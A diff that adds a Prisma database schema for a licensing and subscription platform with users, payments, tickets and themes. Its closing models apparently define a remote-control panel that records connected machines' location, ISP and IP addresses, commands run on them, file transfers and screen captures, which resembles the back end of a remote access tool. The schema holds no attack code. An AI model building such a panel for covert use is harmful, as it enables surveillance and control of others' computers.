@@ -1,0 +1,706 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+// For Vercel deployment: change provider to "postgresql" and use a PostgreSQL URL
+// Recommended: Supabase (supabase.com) or Neon (neon.tech)
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+  directUrl = env("DIRECT_URL") // For serverless via Supabase/Neon
+}
+
+model User {
+  id            String   @id @default(cuid())
+  username      String   @unique
+  name          String?
+  email         String?
+  emailVerified DateTime?
+  password      String?
+  image         String?
+  banner        String?
+  googleEmail   String?
+  loginCount    Int      @default(0)
+  lastLoginAt   DateTime?
+  role          String   @default("customer")
+  planId        String?
+  isTwoFactorEnabled Boolean @default(false)
+  twoFactorSecret String?
+  banned        Boolean  @default(false)
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+
+  accounts       Account[]
+  sessions       Session[]
+  licenses       License[]
+  payments       Payment[]
+  tickets        Ticket[]
+  ticketReplies  TicketReply[]
+  notifications  Notification[]
+  loginHistory   LoginHistory[]
+  devices        UserDevice[]
+  referralsGiven Referral[]       @relation("Referrer")
+  referralsUsed  Referral[]       @relation("ReferredUser")
+  reviews        Review[]
+  downloads      Download[]
+  themes         Theme[]
+  activities     ActivityLog[]
+  coupons        Coupon[]
+  settings       UserSettings?
+  internalNotes  InternalNote[]
+
+  @@map("users")
+}
+
+model Account {
+  id                String  @id @default(cuid())
+  userId            String
+  type              String
+  provider          String
+  providerAccountId String
+  refresh_token     String?
+  access_token      String?
+  expires_at        Int?
+  token_type        String?
+  scope             String?
+  id_token          String?
+  session_state     String?
+
+  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  @@unique([provider, providerAccountId])
+  @@map("accounts")
+}
+
+model Session {
+  id           String   @id @default(cuid())
+  sessionToken String   @unique
+  userId       String
+  expires      DateTime
+  userAgent    String?
+  ip           String?
+  deviceInfo   String?
+
+  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  @@map("sessions")
+}
+
+model VerificationToken {
+  identifier String
+  token      String   @unique
+  expires    DateTime
+
+  @@unique([identifier, token])
+  @@map("verification_tokens")
+}
+
+model Plan {
+  id            String   @id @default(cuid())
+  name          String
+  description   String?
+  price         Float
+  originalPrice Float?
+  currency      String   @default("USD")
+  interval      String   @default("monthly")
+  durationDays  Int
+  features      String   @default("[]")
+  isPopular     Boolean  @default(false)
+  isActive      Boolean  @default(true)
+  sortOrder     Int      @default(0)
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+
+  licenses License[]
+
+  @@map("plans")
+}
+
+model License {
+  id            String   @id @default(cuid())
+  licenseKey    String   @unique
+  userId        String
+  planId        String?
+  status        String   @default("active")
+  startsAt      DateTime @default(now())
+  expiresAt     DateTime
+  gracePeriodEnd DateTime?
+  activatedAt   DateTime?
+  activatedOn   String?
+  hardwareId    String?
+  ipAddress     String?
+  maxActivations Int     @default(3)
+  activationCount Int   @default(0)
+  isLifetime    Boolean  @default(false)
+  autoRenew     Boolean  @default(false)
+  renewalCount  Int      @default(0)
+  lastRenewedAt DateTime?
+  cancelledAt   DateTime?
+  notes         String?
+  assignedRole  String   @default("user")
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+
+  user           User           @relation(fields: [userId], references: [id])
+  plan           Plan?          @relation(fields: [planId], references: [id])
+  payments       Payment[]
+  licenseHistory LicenseHistory[]
+  notifications  Notification[]
+
+  @@map("licenses")
+}
+
+model LicenseHistory {
+  id        String   @id @default(cuid())
+  licenseId String
+  action    String
+  details   String?
+  ip        String?
+  createdAt DateTime @default(now())
+
+  license License @relation(fields: [licenseId], references: [id])
+
+  @@map("license_history")
+}
+
+model Payment {
+  id            String   @id @default(cuid())
+  userId        String
+  licenseId     String?
+  planId        String?
+  amount        Float
+  currency      String   @default("USD")
+  status        String   @default("pending")
+  method        String?
+  transactionId String?
+  couponId      String?
+  referralId    String?
+  invoiceUrl    String?
+  description   String?
+  reviewStatus  String   @default("pending")
+  priority      String   @default("normal")
+  reviewedBy    String?
+  reviewedAt    DateTime?
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+
+  user    User     @relation(fields: [userId], references: [id])
+  license License? @relation(fields: [licenseId], references: [id])
+
+  @@map("payments")
+}
+
+model InternalNote {
+  id          String   @id @default(cuid())
+  content     String
+  authorId    String
+  targetType  String
+  targetId    String
+  isPinned    Boolean  @default(false)
+  editedAt    DateTime?
+  createdAt   DateTime @default(now())
+
+  author User @relation(fields: [authorId], references: [id])
+
+  @@map("internal_notes")
+}
+
+model Coupon {
+  id            String   @id @default(cuid())
+  code          String   @unique
+  description   String?
+  discountType  String   @default("percentage")
+  discountValue Float
+  maxUses       Int?
+  usedCount     Int      @default(0)
+  minAmount     Float?
+  maxAmount     Float?
+  appliesToPlan String?
+  startsAt      DateTime?
+  expiresAt     DateTime?
+  isActive      Boolean  @default(true)
+  createdById   String
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+
+  createdBy User @relation(fields: [createdById], references: [id])
+
+  @@map("coupons")
+}
+
+model Referral {
+  id            String   @id @default(cuid())
+  referrerId    String
+  referredId    String?
+  referredEmail String?
+  code          String
+  status        String   @default("pending")
+  rewardAmount  Float?
+  rewardGiven   Boolean  @default(false)
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+
+  referrer User @relation("Referrer", fields: [referrerId], references: [id])
+  referred User? @relation("ReferredUser", fields: [referredId], references: [id])
+
+  @@map("referrals")
+}
+
+model Ticket {
+  id         String   @id @default(cuid())
+  userId     String
+  subject    String
+  message    String
+  category   String?
+  priority   String   @default("medium")
+  status     String   @default("open")
+  assignedTo String?
+  order      Int      @default(0)
+  createdAt  DateTime @default(now())
+  updatedAt  DateTime @updatedAt
+
+  user    User           @relation(fields: [userId], references: [id])
+  replies TicketReply[]
+
+  @@map("tickets")
+}
+
+model TicketReply {
+  id        String   @id @default(cuid())
+  ticketId  String
+  userId    String
+  message   String
+  isStaff   Boolean  @default(false)
+  createdAt DateTime @default(now())
+
+  ticket Ticket @relation(fields: [ticketId], references: [id])
+  user   User   @relation(fields: [userId], references: [id])
+
+  @@map("ticket_replies")
+}
+
+model FaqCategory {
+  id       String @id @default(cuid())
+  name     String
+  slug     String @unique
+  order    Int    @default(0)
+  questions Faq[]
+
+  @@map("faq_categories")
+}
+
+model Faq {
+  id         String   @id @default(cuid())
+  categoryId String?
+  question   String
+  answer     String
+  order      Int      @default(0)
+  isPublished Boolean @default(true)
+  createdAt  DateTime @default(now())
+  updatedAt  DateTime @updatedAt
+
+  category FaqCategory? @relation(fields: [categoryId], references: [id])
+
+  @@map("faqs")
+}
+
+model KnowledgeArticle {
+  id        String   @id @default(cuid())
+  title     String
+  slug      String   @unique
+  content   String
+  category  String?
+  tags      String?
+  views     Int      @default(0)
+  isPublished Boolean @default(true)
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  @@map("knowledge_articles")
+}
+
+model Theme {
+  id          String   @id @default(cuid())
+  name        String
+  description String?
+  slug        String   @unique
+  userId      String?
+  type        String   @default("custom")
+  category    String?
+  isPublic    Boolean  @default(false)
+  isActive    Boolean  @default(false)
+  featured    Boolean  @default(false)
+  isPremium   Boolean  @default(false)
+  config      String   @default("{}")
+  wallpaper   String?
+  background  String?
+  accentColor String?
+  downloads   Int      @default(0)
+  rating      Float    @default(0)
+  createdAt   DateTime @default(now())
+  updatedAt   DateTime @updatedAt
+
+  user    User?    @relation(fields: [userId], references: [id])
+  reviews Review[]
+
+  @@map("themes")
+}
+
+model Review {
+  id        String   @id @default(cuid())
+  userId    String
+  themeId   String
+  rating    Int
+  comment   String?
+  createdAt DateTime @default(now())
+
+  user  User  @relation(fields: [userId], references: [id])
+  theme Theme @relation(fields: [themeId], references: [id])
+
+  @@unique([userId, themeId])
+  @@map("reviews")
+}
+
+model Notification {
+  id        String   @id @default(cuid())
+  userId    String?
+  licenseId String?
+  type      String
+  title     String
+  message   String
+  read      Boolean  @default(false)
+  createdAt DateTime @default(now())
+
+  user    User?    @relation(fields: [userId], references: [id])
+  license License? @relation(fields: [licenseId], references: [id])
+
+  @@map("notifications")
+}
+
+model LoginHistory {
+  id        String   @id @default(cuid())
+  userId    String
+  ip        String?
+  userAgent String?
+  location  String?
+  device    String?
+  status    String   @default("success")
+  reason    String?
+  createdAt DateTime @default(now())
+
+  user User @relation(fields: [userId], references: [id])
+
+  @@map("login_history")
+}
+
+model UserDevice {
+  id        String   @id @default(cuid())
+  userId    String
+  name      String?
+  type      String?
+  os        String?
+  browser   String?
+  ip        String?
+  isTrusted Boolean  @default(false)
+  lastUsed  DateTime @default(now())
+  createdAt DateTime @default(now())
+
+  user User @relation(fields: [userId], references: [id])
+
+  @@map("user_devices")
+}
+
+model ActivityLog {
+  id        String   @id @default(cuid())
+  userId    String?
+  action    String
+  details   String?
+  ip        String?
+  userAgent String?
+  createdAt DateTime @default(now())
+
+  user User? @relation(fields: [userId], references: [id])
+
+  @@map("activity_logs")
+}
+
+model Backup {
+  id        String   @id @default(cuid())
+  name      String
+  filePath  String?
+  size      Int?
+  type      String   @default("manual")
+  status    String   @default("completed")
+  createdAt DateTime @default(now())
+
+  @@map("backups")
+}
+
+model Announcement {
+  id        String   @id @default(cuid())
+  title     String
+  content   String
+  type      String   @default("info")
+  isPublic  Boolean  @default(true)
+  isActive  Boolean  @default(true)
+  startsAt  DateTime?
+  expiresAt DateTime?
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  @@map("announcements")
+}
+
+model Changelog {
+  id        String   @id @default(cuid())
+  version   String
+  title     String
+  content   String
+  type      String   @default("feature")
+  isPublished Boolean @default(true)
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  @@map("changelogs")
+}
+
+model Download {
+  id        String   @id @default(cuid())
+  userId    String
+  name      String
+  filePath  String
+  fileSize  Int?
+  downloads Int      @default(1)
+  createdAt DateTime @default(now())
+
+  user User @relation(fields: [userId], references: [id])
+
+  @@map("downloads")
+}
+
+model Setting {
+  id    String @id @default(cuid())
+  key   String @unique
+  value String
+  type  String @default("string")
+
+  @@map("settings")
+}
+
+model PageView {
+  id        String   @id @default(cuid())
+  path      String
+  referrer  String?
+  userAgent String?
+  ip        String?
+  createdAt DateTime @default(now())
+
+  @@map("page_views")
+}
+
+model MaintenanceMode {
+  id        String   @id @default(cuid())
+  isActive  Boolean  @default(false)
+  title     String?
+  message   String?
+  allowedIps String?
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  @@map("maintenance_mode")
+}
+
+model UserSettings {
+  id              String  @id @default(cuid())
+  userId          String  @unique
+  theme           String  @default("dark")
+  accentColor     String  @default("violet")
+  background      String?
+  wallpaper       String?
+  blur            Int     @default(20)
+  motionBlur      Int     @default(10)
+  transparency    Int     @default(10)
+  brightness      Int     @default(100)
+  contrast        Int     @default(100)
+  saturation      Int     @default(100)
+  bgIntensity     Int     @default(100)
+  scale           Int     @default(100)
+  textSize        String  @default("normal")
+  animationsEnabled Boolean @default(true)
+
+  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
+
+  @@map("user_settings")
+}
+
+model OwnerLicense {
+  id            String   @id @default(cuid())
+  licenseKey    String   @unique
+  licenseHash   String
+  username      String   @unique
+  passwordHash  String
+  isActive      Boolean  @default(true)
+  isLifetime    Boolean  @default(true)
+  lastRotatedAt DateTime?
+  lastUsedAt    DateTime?
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+
+  sessions  OwnerSession[]
+  auditLogs OwnerAuditLog[]
+
+  @@map("owner_licenses")
+}
+
+model OwnerSession {
+  id        String   @id @default(cuid())
+  ownerId   String
+  token     String   @unique
+  ip        String?
+  userAgent String?
+  deviceInfo String?
+  isActive  Boolean  @default(true)
+  lastUsed  DateTime @default(now())
+  expiresAt DateTime
+  createdAt DateTime @default(now())
+
+  owner OwnerLicense @relation(fields: [ownerId], references: [id], onDelete: Cascade)
+
+  @@map("owner_sessions")
+}
+
+model OwnerAuditLog {
+  id        String   @id @default(cuid())
+  ownerId   String
+  action    String
+  details   String?
+  ip        String?
+  userAgent String?
+  createdAt DateTime @default(now())
+
+  owner OwnerLicense @relation(fields: [ownerId], references: [id])
+
+  @@map("owner_audit_logs")
+}
+
+model Builder {
+  id            String   @id @default(cuid())
+  uuid          String   @unique
+  name          String
+  description   String?
+  certificate   String
+  fingerprint   String
+  isActive      Boolean  @default(true)
+  lastSeen      DateTime?
+  createdAt     DateTime @default(now())
+  updatedAt     DateTime @updatedAt
+
+  clients       RemoteClient[]
+  allowedDomains String?
+  country       String?
+
+  @@map("builders")
+}
+
+model RemoteClient {
+  id              String   @id @default(cuid())
+  builderId       String
+  clientId        String   @unique
+  country         String?
+  countryCode     String?
+  city            String?
+  isp             String?
+  user            String?
+  hostname        String?
+  ipPublic        String?
+  ipLocal         String?
+  cpu             Float?
+  ramUsed         Float?
+  ramTotal        Float?
+  os              String?
+  version         String?
+  status          String   @default("offline")
+  lastSeen        DateTime @default(now())
+  firstSeen       DateTime @default(now())
+  certificate     String?
+  fingerprint     String?
+  isVerified      Boolean  @default(false)
+  notes           String?
+  hardwareId      String?
+  screenWidth     Int?
+  screenHeight    Int?
+  createdAt       DateTime @default(now())
+  updatedAt       DateTime @updatedAt
+
+  builder         Builder  @relation(fields: [builderId], references: [id], onDelete: Cascade)
+  sessions        ClientSession[]
+  commands        CommandLog[]
+  fileTransfers   FileTransfer[]
+  screenCaptures  ScreenCapture[]
+
+  @@map("remote_clients")
+}
+
+model ClientSession {
+  id        String   @id @default(cuid())
+  clientId  String
+  type      String   @default("websocket")
+  status    String   @default("active")
+  ip        String?
+  userAgent String?
+  connectedAt DateTime @default(now())
+  disconnectedAt DateTime?
+
+  client    RemoteClient @relation(fields: [clientId], references: [id], onDelete: Cascade)
+
+  @@map("client_sessions")
+}
+
+model CommandLog {
+  id        String   @id @default(cuid())
+  clientId  String
+  command   String
+  output    String?
+  status    String   @default("pending")
+  executedBy String?
+  executedAt DateTime @default(now())
+  completedAt DateTime?
+
+  client    RemoteClient @relation(fields: [clientId], references: [id], onDelete: Cascade)
+
+  @@map("command_logs")
+}
+
+model FileTransfer {
+  id          String   @id @default(cuid())
+  clientId    String
+  direction   String   @default("upload")
+  fileName    String
+  fileSize    Int?
+  filePath    String?
+  status      String   @default("pending")
+  progress    Float    @default(0)
+  checksum    String?
+  startedAt   DateTime @default(now())
+  completedAt DateTime?
+
+  client      RemoteClient @relation(fields: [clientId], references: [id], onDelete: Cascade)
+
+  @@map("file_transfers")
+}
+
+model ScreenCapture {
+  id        String   @id @default(cuid())
+  clientId  String
+  imagePath String?
+  width     Int?
+  height    Int?
+  format    String   @default("png")
+  size      Int?
+  triggeredBy String?
+  createdAt DateTime @default(now())
+
+  client    RemoteClient @relation(fields: [clientId], references: [id], onDelete: Cascade)
+
+  @@map("screen_captures")
+}
